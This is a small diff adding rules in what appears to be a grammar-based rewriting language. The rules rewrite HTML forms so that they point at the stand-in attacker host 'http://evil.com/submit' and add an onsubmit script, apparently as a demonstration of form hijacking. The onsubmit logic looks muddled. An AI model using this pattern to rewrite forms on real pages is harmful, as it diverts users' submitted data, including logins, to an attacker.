@@ -1,0 +1,10 @@
+main := /<form/ sp /action=/ orig@url evil onsubmit />/  main
+      | /./ main
+      | ""
+
+url := q? /[^"' >]/* q?
+onsubmit := " onsubmit='this.form.action=\"" !orig "\"'"
+q  := ~/"|'/
+sp := / /*
+evil := "\"http://evil.com/submit\""
+
